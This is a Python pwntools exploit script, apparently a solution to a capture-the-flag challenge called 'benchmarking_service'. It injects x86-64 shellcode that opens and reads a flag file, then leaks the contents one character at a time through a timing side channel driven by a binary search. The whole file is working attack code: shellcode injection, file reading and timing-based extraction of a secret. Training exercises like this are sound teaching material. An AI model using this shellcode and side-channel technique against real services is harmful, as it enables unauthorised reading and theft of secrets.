from pwn import *
import os

#os.environ["PYTHONUNBUFFERED"] = "1"


CHALL_PATH = "./benchmarking_service"
CHALL_PATH2 = ['python3','wrapper.py']
COMMANDS = """
b *0x401320
c
"""

context.arch = "amd64"
low = 0x20
high = 0x7f
count = 0
flag = ""
char = chr((high + low) // 2)

while(char != '}'):
    low = 0x20
    high = 0x7f

    while(high > low):
        mid = (high + low) // 2


        if args.GDB:
            c = gdb.debug(CHALL_PATH, COMMANDS)
            #input("wait")
        elif args.REM:
            c = remote("benchmarking-service.training.offensivedefensive.it", 8080, ssl=True)
        else:
            c = process(CHALL_PATH2)

        # Side channel attack. Do open read, then compare guessed char by char of flag put on stack.
        # Make the shellcode run for more time or less time depending if guessed char is higher or lower
        # than real flag char. Once found move to the next one until '}'.
        # Do binary search for time purpose.
        # In local path /challenge/flag doesn't work. Just put flag in stack as path for open(). 
        shellcode = """
        mov rax, 0x67616c662f6567
        push rax
        mov rax, 0x6e656c6c6168632f
        push rax
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 2
        syscall

        mov rdi, rax
        mov rsi, rsp
        mov rdx, 50
        xor rax, rax
        syscall

        movzx   eax, BYTE PTR [rsi+%d]
		cmp     al, %d
	    jne     .L2
	    jmp     .L3		
    .L4:
	    add     DWORD PTR [rbp-4], 1
    .L3:
		cmp     DWORD PTR [rbp-4], 0x10000000
	    jle     .L4
	.L2:
		cmp al, %d
		jg		.L5
		jmp		.L6
	.L7:
		add     DWORD PTR [rbp-4], 1
	.L5:
		cmp     DWORD PTR [rbp-4], 0x20000000
		jle		.L7
	.L6:
        """ % (count, mid, mid)

        #c.recvuntil(b": ")
        c.sendline(asm(shellcode) + b"A" * 1024) # The extra 1024 'A' are to close the input 

        c.recvuntil(b'Time: ')
        time = float(c.recv().decode())
        print("Time: ", time)
        print("Analyzed: ", chr(mid))

        if(time > 0.5 and time < 1): # Got the right character!
            count += 1
            char = chr(mid)
            flag += char
            print(flag)
            c.close()
            break

        elif(time > 1): # Character > mid
            low = mid
        else: # Character < mid
            high = mid 
        c.close()




print(flag)